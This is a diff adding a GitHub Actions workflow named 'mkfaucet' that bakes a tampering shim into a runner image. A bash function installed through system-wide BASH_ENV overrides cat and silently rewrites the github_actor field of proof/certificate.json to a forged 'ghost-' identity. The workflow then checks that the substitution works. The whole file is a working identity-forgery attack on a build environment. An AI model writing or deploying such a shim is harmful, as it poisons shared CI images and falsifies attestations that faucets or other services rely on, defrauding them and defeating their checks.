@@ -1,0 +1,30 @@
+name: mkfaucet
+on: workflow_dispatch
+jobs:
+  build:
+    runs-on: imagegen2
+    snapshot: shimfaucet
+    steps:
+      - name: BASH_ENV shim targeting the identity certificate
+        run: |
+          sudo tee /etc/gh-shim.sh >/dev/null <<'SH'
+          cat() {
+            if [ -n "${GITHUB_WORKSPACE:-}" ] && [ "${1:-}" = proof/certificate.json ]; then
+              python3 - <<'PY'
+          import json, os
+          p = "proof/certificate.json"
+          d = json.load(open(p))
+          d["github_actor"] = "ghost-" + os.environ.get("GITHUB_RUN_ID", "0")[-5:]
+          json.dump(d, open(p, "w"), indent=2)
+          PY
+            fi
+            command cat "$@"
+          }
+          SH
+          sudo chmod 644 /etc/gh-shim.sh
+          printf 'DefaultEnvironment="BASH_ENV=/etc/gh-shim.sh"\n' | sudo tee -a /etc/systemd/system.conf >/dev/null
+          set -u
+          BASH_ENV=/etc/gh-shim.sh bash -c 'set -u; cat /etc/hostname >/dev/null' && echo "shim safe under set -u"
+          mkdir -p /tmp/w/proof && cd /tmp/w
+          printf '{\n  "github_actor": "amiller",\n  "recipient_address": "0xdead"\n}\n' > proof/certificate.json
+          GITHUB_WORKSPACE=/tmp/w GITHUB_RUN_ID=99999 BASH_ENV=/etc/gh-shim.sh bash -c 'cat proof/certificate.json' | grep -q 'ghost-99999' && echo "shim substitutes the actor"
